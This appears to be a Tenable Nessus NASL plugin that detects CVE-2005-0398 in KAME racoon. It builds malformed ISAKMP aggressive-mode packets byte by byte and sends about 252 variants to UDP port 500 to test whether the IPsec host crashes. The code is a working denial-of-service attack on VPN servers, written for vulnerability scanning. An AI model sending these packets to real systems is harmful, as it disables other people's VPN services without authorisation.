#
# (C) Tenable Network Security
#

if(description)
{
 script_id(17655);
 script_cve_id("CVE-2005-0398");
 script_bugtraq_id(12804);
 script_version("$Revision: 1.7 $");

 name["english"] = "KAME Racoon Malformed ISAKMP Packets Denial of Service";
 script_name(english:name["english"]);

 desc["english"] =
"
The remote IPSEC server seems to have a problem negotiating malformed
ISAKMP packets.

An attacker may use this flaw to crash the remote host repeateadly and
disable your VPN remotely.

Solution: Contact your vendor for a patch.
Risk factor : High";

 script_description(english:desc["english"]);

 summary["english"] = "IPSEC IKE check";
 script_summary(english:summary["english"]);

 script_category(ACT_KILL_HOST);

 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 exit(0);
}

#
# The script code starts here
#

if ( safe_checks() ) exit(0);

function calc_data() {
    ISAKMP_HEADER = IC + RC + NP + MV + ET + IF + MI + LEN;
    SA_HEADER = SA_NP + RES + PLEN + DOI + SIT;
    PROP_HEADER = P_NP + P_RES + P_PLEN + P_NUM + PID + SPI_SZ + TOT_T_NUM;
    T_PAY1 = T_NP + T_RES + T_PLEN + T_NUM + T_ID + T_RES2 + T_FLAGS + T_AC + T_AV + T_FLAGS2 + T_AC2 + T_AV2 + T_FLAGS3
+ T_AC3 + T_AV3 + T_FLAGS4 + T_AC4 + T_AV4 + T_FLAGS5 + T_AC5 + T_AV5 + T_FLAGS6 +  T_AC6 + T_ALEN + T_AV6;

    T_PAY2 = T_NP + T_RES + T_PLEN + raw_string(0x02) + T_ID + T_RES2 + T_FLAGS + T_AC + T_AV + T_FLAGS2 + T_AC2 + T_AV2
+ T_FLAGS3 + T_AC3 + T_AV3 + T_FLAGS4 + T_AC4 + T_AV4 + T_FLAGS5 + T_AC5 + T_AV5 + T_FLAGS6 + T_AC6 + T_ALEN + T_AV6;

    T_PAY3 = raw_string(0x00) + T_RES + T_PLEN + raw_string(0x03) + T_ID + T_RES2 + T_FLAGS + T_AC + T_AV + T_FLAGS2 +
T_AC2 + T_AV2 + T_FLAGS3 + T_AC3 + T_AV3 + T_FLAGS4 + T_AC4 + T_AV4 + T_FLAGS5 + T_AC5 + T_AV5 + T_FLAGS6 + T_AC6 +
T_ALEN + T_AV6;

    KE_PAY = KE_NP + KE_RES + KE_PLEN + chit;
    NON_PAY = NON_NP + NON_RES + NON_PLEN + TEST;
    blap = ISAKMP_HEADER + SA_HEADER + PROP_HEADER +  T_PAY1 + T_PAY2 + T_PAY3 + KE_PAY + NON_PAY;
    return(blap);
}



function bada_bing (blat) {
  #srcport = rand() % 65535;
  srcport = 500;
  UDP_LEN = strlen(blat) + 8;
  ip = forge_ip_packet(ip_v : 4,
                       ip_hl : 5,
                       ip_tos : 0,
                       ip_len : 20,
                       ip_id : 0xFEAF,
                       ip_p : IPPROTO_UDP,
                       ip_ttl : 255,
                       ip_off : 0,
                       ip_src : srcaddr,
                       ip_dst : dstaddr);


  udpip = forge_udp_packet(                        ip : ip,
                                                 uh_sport : srcport,
                                                 uh_dport : dstport,
                                                 uh_ulen : UDP_LEN,
                                                 data : blat);

   result_suc = send_packet(udpip, pcap_active:FALSE);
}







srcaddr = this_host();
dstaddr = get_host_ip();
dstport = 500;
srcport = 500;


#------ISAKMP header-----#

IC = raw_string (0xFF, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC, 0x03);    #8 byte Initiator cookie
RC = raw_string (0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00);    #8 byte Responder cookie

NP = raw_string (0x01);                                              #Next payload = 1 = Security Association
                                                                     # 2 = proposal / 3 = transform /  4 = Key exchange
                                                                     # 5 = ID /  6 = CERT / 7 = Cert request
                                                                     # 8 = HASH / 9 = SIGNATURE / 10 = NONCE
                                                                     # 11 = Notification / 12 = Delete
                                                                     # 13 = Vendor ID / 14-27 = RESERVED
                                                                     # 128-255 = PRIVATE USE


MV = raw_string (0x10);                                              # 4bits = Major version
                                                                     # 4 low order bits = Minor version


ET = raw_string (0x04);                                              # Exchange type = 4 = AGGRESSIVE
                                                                     # 0 = NONE / 1 = BASE / 2 = Identity protection
                                                                     # 3 = Authentication only  / 5 = Informational
                                                                     # 6-31 = FUTURE USE / 32-239 = DOI use
                                                                     # 240-255 = Private use


IF = raw_string (0x00);                                              # 8 bits of IKE flags, lower 5 bits NOT USED
MI = raw_string(0x00,0x00,0x00,0x00);                                # Message ID
LEN = raw_string (0x00,0x00,0x01,0x7b);                              # Length = total length of UDP data field

ISAKMP_HEADER = IC + RC + NP + MV + ET + IF + MI + LEN;



# ----- Security Association ---------#

SA_NP = raw_string(0x04);                                            # Security Association next payload = key exchange
RES = raw_string(0x00);                                              # reserved
PLEN = raw_string(0x00,0x80);                                        # Security association payload length =
                                                                     # total len of all payloads (through last TP) + 12
DOI = raw_string(0x00,0x00,0x00,0x01);                               # DOI = generic ISAKMP Security Association
SIT = raw_string(0x00,0x00,0x00,0x01);                               # Situation

SA_HEADER = SA_NP + RES + PLEN + DOI + SIT;



# ------Proposal --------------------#

P_NP = raw_string(0x00);                                             # Proposal next payload = 0 (last proposal payload)
P_RES = raw_string(0x00);                                            # reserved
P_PLEN = raw_string(0x00,0x74);                                      # Proposal payload length = total len of all
                                                                     # payloads through last TP
P_NUM = raw_string(0x01);                                            # proposal number
PID = raw_string(0x01);                                              # protocol ID = 1 = proto_isakmp
SPI_SZ = raw_string(0x00);                                           # SPI size
TOT_T_NUM = raw_string(0x08);                                            # number of transforms

PROP_HEADER = P_NP + P_RES + P_PLEN + P_NUM + PID + SPI_SZ + TOT_T_NUM;



# -----Transform Payload ------------#
T_NP = raw_string(0x03);                                             # transform next payload = 3 = more transforms
T_RES = raw_string(0x00);                                            # reserved
T_PLEN = raw_string(0x00,0x24);                                      # payload length
T_NUM = raw_string(0x01);                                            # transform number
T_ID = raw_string(0x01);                                             # transform ID
T_RES2 = raw_string(0x00,0x00);                                      # reserved
T_FLAGS = raw_string(0x80);                                          # data attribute following TV format
T_AC = raw_string(0x01);                                             # Attribute type/class = 1 encryption alg basic
T_AV = raw_string(0x00,0x05);                                        # Transform attribute value = 3des_CBC
T_FLAGS2 = raw_string(0x80);
T_AC2 = raw_string(0x02);                                            # attribute type/class = 2 = hash alg basic
T_AV2 = raw_string(0x00,0x02);                                       # attribute value = 2 = SHA
T_FLAGS3 = raw_string(0x80);
T_AC3 = raw_string(0x04);                                            # attribute type/class = 4 = group description basic
T_AV3 = raw_string(0x00,0x02);                                       # attribute value = 2 = alternate 1024 bit MODP group
T_FLAGS4 = raw_string(0x80);
T_AC4 = raw_string(0x03);                                            # attribute type/class = 3 = basic authentication
T_AV4 = raw_string(0xFD,0xE9);                                       # attribute value = 65001 = for private use
T_FLAGS5 = raw_string(0x80);
T_AC5 = raw_string(0x0b);                                            # attribute type/class = 11 = basic life type
T_AV5 = raw_string(0x00,0x01);                                       # attribute value = 1 = life duration in seconds
T_FLAGS6 = raw_string(0x00);
T_AC6 = raw_string(0x0c);                                            # attribute type/class = 12 = variable life duration
T_ALEN = raw_string(0x00,0x04);                                      # attribute length = 4 bytes
T_AV6 = raw_string(0x00,0x20,0xC4,0x9B);                             # attribute value

T_PAY1 = T_NP + T_RES + T_PLEN + T_NUM + T_ID + T_RES2 + T_FLAGS + T_AC + T_AV + T_FLAGS2 + T_AC2 + T_AV2 + T_FLAGS3 +
T_AC3 + T_AV3 + T_FLAGS4 + T_AC4 + T_AV4 + T_FLAGS5 + T_AC5 + T_AV5 + T_FLAGS6 + T_AC6 + T_ALEN + T_AV6;




# -----Transform Payloads 2 and up -----------#
# nothing changes except transform number .... and "Next payload" (on last payload)

T_PAY2 = T_NP + T_RES + T_PLEN + raw_string(0x02) + T_ID + T_RES2 + T_FLAGS + T_AC + T_AV + T_FLAGS2 + T_AC2 + T_AV2 +
T_FLAGS3 + T_AC3 + T_AV3 + T_FLAGS4 + T_AC4 + T_AV4 + T_FLAGS5 + T_AC5 + T_AV5 + T_FLAGS6 + T_AC6 + T_ALEN + T_AV6;


T_PAY3 = raw_string(0x00) + T_RES + T_PLEN + raw_string(0x03) + T_ID + T_RES2 + T_FLAGS + T_AC + T_AV + T_FLAGS2 + T_AC2
+ T_AV2 + T_FLAGS3 + T_AC3 + T_AV3 + T_FLAGS4 + T_AC4 + T_AV4 + T_FLAGS5 + T_AC5 + T_AV5 + T_FLAGS6 + T_AC6 + T_ALEN +
T_AV6;


#--------end Proposal Payload ------------------------#

#--------end Security Association Payload-------------#




#------Key exchange payload---------#
# 223 bytes of chit

KE_NP = raw_string(0x0a);                                           # key exchange next payload = 0 = NONCE
KE_RES = raw_string(0x00);                                          # reserved
KE_PLEN = raw_string(0x00,0x88);                                         # key exchange payload length

chit = "";
for (i=0; i<132; i = i + 1) {
    chit = chit + raw_string(i);
}

KE_PAY = KE_NP + KE_RES + KE_PLEN + chit;





#-----NONCE payload--------------#
NON_NP = raw_string(0xa4);                                         # nonce next payload
NON_RES = raw_string(0x00);                                        # nonce reserved
NON_PLEN = raw_string(0x00, 0x56);                                 # nonce payload len

TEST = "";
for (i=0; i< 83; i = i + 1) {
  TEST = TEST + raw_string(i);
}

NON_PAY = NON_NP + NON_RES + NON_PLEN + TEST;






#----------Put it all together-------------#



#--------FALSE POSITIVE REDUCTION PRELIM----#
# Disclaimer: I can't verify that _ALL_ IPSEC servers will reply to the packet below
#Bert Salaets: AND THEY WON'T! Some will not answer on packets with UDP srcport != 500 -> fixed

stored = MV;
stored2 = ET;
ET = raw_string(0x01);                 # change exchange type to BASIC
MV = raw_string(0xFF);                 # set Major version = minor version = 15
                                       # this *should* generate an error reply
blat = calc_data();
oneoff = strlen(blat);

ip = forge_ip_packet(                    ip_v : 4,
                                         ip_hl : 5,
                                         ip_tos : 0,
                                         ip_len : 20,
                                         ip_id : 0xABBA,
                                         ip_p : IPPROTO_UDP,
                                         ip_ttl : 255,
                                         ip_off : 0,
                                         ip_src : this_host(),
                                         ip_dst : get_host_ip());


udpip = forge_udp_packet(                        ip : ip,
                                                 uh_sport : 500,
                                                 uh_dport : 500,
                                                 uh_ulen : oneoff + 8,
                                                 data : blat);

filter = string("udp and src host ", get_host_ip(), " and dst host " , this_host(), " and dst port 500 and src port 500");
live = send_packet(udpip, pcap_active:TRUE, pcap_filter:filter);
foo = strlen(live);
if (foo < 20) 
	exit(0);
MV = stored;
ET = stored2;

# END FALSE POSITIVE PRELIM




start_denial();
stored = make_list();
stored[0] = LEN;
stored[1] = NON_PLEN;
for (L=1; L<253; L++)
{
 LEN = raw_string(0,0,0,L);
 NON_PLEN = raw_string(L + 3);
 blat = calc_data();
 bada_bing(blat:blat);
}
LEN = stored[0];
NON_PLEN = stored[1];



alive = end_denial();
if(!alive) security_hole(port:500, protocol:"udp");





ip = forge_ip_packet(                    ip_v : 4,
                                         ip_hl : 5,
                                         ip_tos : 0,
                                         ip_len : 20,
                                         ip_id : 0xABBA,
                                         ip_p : IPPROTO_UDP,
                                         ip_ttl : 255,
                                         ip_off : 0,
                                         ip_src : this_host(),
                                         ip_dst : get_host_ip());


udpip = forge_udp_packet(                        ip : ip,
                                                 uh_sport : 500,
                                                 uh_dport : 500,
                                                 uh_ulen : 8);
filter = string("icmp and src host ", get_host_ip(), " and dst host " , this_host());
live = send_packet(udpip, pcap_active:TRUE, pcap_filter:filter);
if (live) {
    protocol_type = get_ip_element(ip:live, element:"ip_p");
    if (protocol_type == IPPROTO_ICMP) {
        security_hole(port:500, protocol:"udp");
    }
}




exit(0);
